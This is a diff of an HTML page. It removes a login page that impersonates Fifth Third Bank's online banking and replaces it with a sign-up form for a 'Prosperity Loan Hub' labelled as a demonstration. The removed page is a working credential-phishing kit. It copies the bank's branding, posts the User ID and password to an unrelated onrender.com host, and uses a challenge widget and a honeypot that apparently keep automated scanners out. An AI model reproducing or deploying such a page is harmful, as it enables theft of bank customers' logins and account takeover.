@@ -3,288 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login | Online Banking | Fifth Third Bank</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700">
+    <title>Prosperity Loan Hub - Sign Up</title>
+    <link rel="stylesheet" href="style.css">
     <style>
-        body {
-            background: #1a357a;
-            background: linear-gradient(135deg, #1a357a 0%, #2b4fa2 100%);
-            font-family: 'Roboto', Arial, sans-serif;
-            margin: 0;
-            min-height: 100vh;
-        }
-        .header {
-            background: #fff;
-            padding: 0 0 0 0;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border-bottom: 1px solid #eee;
-            height: 80px;
-        }
-        .header-left {
-            display: flex;
-            align-items: center;
-            margin-left: 40px;
-        }
-        .header img {
-            height: 48px;
-        }
-        .header .bank-name {
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: #1a357a;
-            margin-left: 16px;
-            letter-spacing: 1px;
-        }
-        .header .links {
-            margin-right: 40px;
-            color: #444;
-            font-size: 15px;
-            display: flex;
-            align-items: center;
-            gap: 24px;
-            opacity: 0.8;
-        }
-        .breadcrumb {
-            color: #fff;
-            font-size: 15px;
-            margin: 32px 0 0 13vw;
-            letter-spacing: 0.5px;
-        }
-        .breadcrumb a {
-            color: #fff;
-            text-decoration: underline;
-            opacity: 0.85;
-        }
-        .login-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            min-height: 50vh;
-            margin-top: 8px;
-        }
-        .login-box {
-            background: #f7f7f7;
-            max-width: 340px;
-            width: 100%;
-            border-radius: 8px;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
-            padding: 28px 20px 24px 20px;
-            margin-top: 0;
-        }
-        .login-box h2 {
-            margin-top: 0;
-            color: #222;
-            font-size: 2rem;
-            font-weight: 700;
-            margin-bottom: 24px;
-        }
-        .form-group {
-            margin-bottom: 14px;
-        }
-        .input-row {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-        .input-row input {
-            width: 100%;
-            box-sizing: border-box;
-            padding-right: 0;
-            border-right: 1.5px solid #bfc8da;
-        }
-        .save-link {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 12px;
-            color: #1a357a;
-            cursor: pointer;
-            background: #fff;
-            border: 1px solid #bfc8da;
-            border-radius: 4px;
-            padding: 2px 10px;
-            z-index: 2;
-            white-space: nowrap;
-            transition: background 0.2s, color 0.2s;
-            font-weight: 500;
-        }
-        .save-link:hover {
-            background: #1a357a;
-            color: #fff;
-        }
-        .password-row {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-        .password-row input {
-            width: 100%;
-            box-sizing: border-box;
-        }
-        label {
-            display: block;
-            margin-bottom: 6px;
-            color: #222;
-            font-weight: 500;
-        }
-        input, select {
-            width: 100%;
-            padding: 10px 12px;
-            border: 1px solid #bbb;
-            border-radius: 4px;
-            font-size: 1rem;
-        }
-        .btn {
-            width: 100%;
-            background: #1a357a;
-            color: #fff;
-            border: none;
-            padding: 12px;
-            border-radius: 4px;
-            font-size: 1.1rem;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .btn:active {
-            background: #16306a;
-        }
-        .links-row {
-            margin-top: 12px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.97rem;
-        }
-        .links-row a {
-            color: #1a357a;
-            text-decoration: underline;
-        }
-        /* Honeypot field (hidden from users) */
-        .honeypot {
-            display: none;
-        }
-        @media (max-width: 600px) {
-            .login-box {
-                max-width: 95vw;
-                padding: 18px 6vw 18px 6vw;
-            }
-            .header {
-                flex-direction: column;
-                height: auto;
-                padding: 12px 0;
-            }
-            .header-left {
-                margin-left: 0;
-            }
-            .header .links {
-                margin-right: 0;
-                margin-top: 8px;
-            }
-        }
+        h1 { color: #ff6f61; } /* Coral for welcome */
+        .form-group { margin-bottom: 15px; }
+        .disclaimer { color: #e74c3c; font-style: italic; text-align: center; }
     </style>
-    <!-- Cloudflare Turnstile -->
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </head>
 <body>
-    <div class="header">
-        <div class="header-left">
-            <a href="index.html" style="display:flex;align-items:center;text-decoration:none;cursor:pointer;">
-                <img src="53rd.logo.png" alt="Fifth Third Bank Logo">
-                <span class="bank-name">FIFTH THIRD</span>
-            </a>
-        </div>
-        <div class="links">
-            CUSTOMER SERVICE
-            <span>|</span>
-            BRANCH & ATM LOCATOR
-        </div>
-    </div>
-    <div class="breadcrumb">
-        <a href="index.html" style="cursor:pointer;">Home</a> &gt; <b>Login</b>
-    </div>
-    <div class="login-container">
-        <form class="login-box" id="loginForm" method="POST" action="/login" autocomplete="off">
-            <h2>Online Banking Login</h2>
-            <div class="form-group">
-                <select id="bankingType" name="bankingType" style="margin-bottom: 12px;">
-                    <option>Online Banking</option>
-                    <option>Business Banking</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label for="userId">User ID</label>
-                <div class="input-row">
-                    <input type="text" id="userId" name="userId" required autocomplete="username" style="border-right: 1.5px solid #bfc8da;">
+    <header>
+        <h1>Prosperity Loan Hub</h1>
+    </header>
+    <main>
+        <section class="intro">
+            <p>Welcome to the Prosperity Loan Hub – where financial support meets opportunity! 🌟</p>
+            <p>Please sign up below to access the loan application. This portal is for demonstration purposes only.</p>
+            <p class="disclaimer">*This is a mock application. Do not submit real personal data.*</p>
+        </section>
+        <section class="form-container">
+            <form action="application.html" method="get">
+                <div class="form-group">
+                    <label for="fullname">Full Name:</label>
+                    <input type="text" id="fullname" name="fullname" required>
                 </div>
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <div class="password-row">
-                    <input type="password" id="password" name="password" required autocomplete="current-password">
+                <div class="form-group">
+                    <label for="email">Email:</label>
+                    <input type="email" id="email" name="email" required>
                 </div>
-            </div>
-            <!-- Honeypot field -->
-            <div class="honeypot">
-                <label for="email">Email</label>
-                <input type="text" id="email" name="email" autocomplete="off">
-            </div>
-            <!-- Cloudflare Turnstile widget -->
-            <div class="form-group">
-                <div class="cf-turnstile" data-sitekey="ES_3927a4cf31f3440a8ce696cbf37e0268" data-theme="light"></div>
-            </div>
-            <button class="btn" type="submit">LOG IN</button>
-            <div class="links-row">
-                <a href="#">Forgot Login?</a>
-                <a href="#">First Time User? Register.</a>
-            </div>
-        </form>
-    </div>
-    <div style="background:#fff;min-height:32vh;width:100%;margin-top:60px;padding:40px 0 0 0;">
-        <div style="max-width:900px;margin:0 auto;padding:0 24px;">
-            <h2 style="color:#222;font-size:2rem;font-weight:700;margin-bottom:12px;">Log In to View Your Accounts</h2>
-            <p style="color:#222;font-size:1.1rem;line-height:1.6;max-width:700px;">Online banking is available, all day, every day. Simply log in to pay bills, view statements, chat with live agents, pay bills directly from your account, and more.</p>
-        </div>
-    </div>
-    <script>
-        // AJAX login and redirect to details.html on success
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            var honeypot = document.getElementById('email').value;
-            if (honeypot) {
-                alert('Bot detected.');
-                return false;
-            }
-            // Require Cloudflare Turnstile
-            var turnstileResponse = document.querySelector('input[name=cf-turnstile-response]');
-            if (!turnstileResponse || !turnstileResponse.value) {
-                alert('Please complete the verification.');
-                return false;
-            }
-            const form = e.target;
-            const formData = new FormData(form);
-            // Replace YOUR_RAILWAY_URL with your actual Railway backend URL
-            const BACKEND_URL = 'https://my53rd.onrender.com/login';
-            try {
-                const resp = await fetch(BACKEND_URL, {
-                    method: 'POST',
-                    body: formData
-                });
-                const data = await resp.json();
-                if (data.success && data.redirect) {
-                    window.location.href = data.redirect;
-                } else if (data.error) {
-                    alert(data.error);
-                } else {
-                    alert('Login failed.');
-                }
-            } catch (err) {
-                alert('Network error.');
-            }
-        });
-    </script>
+                <!-- Cloudflare Turnstile widget -->
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAABlFptHfMAbc09JP"></div>
+                <button type="submit">Sign Up & Proceed</button>
+            </form>
+        </section>
+    </main>
+    <footer>
+        <p>© 2025 Prosperity Loan Hub | Built for Demonstration</p>
+    </footer>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </body>
-</html> 
+</html>
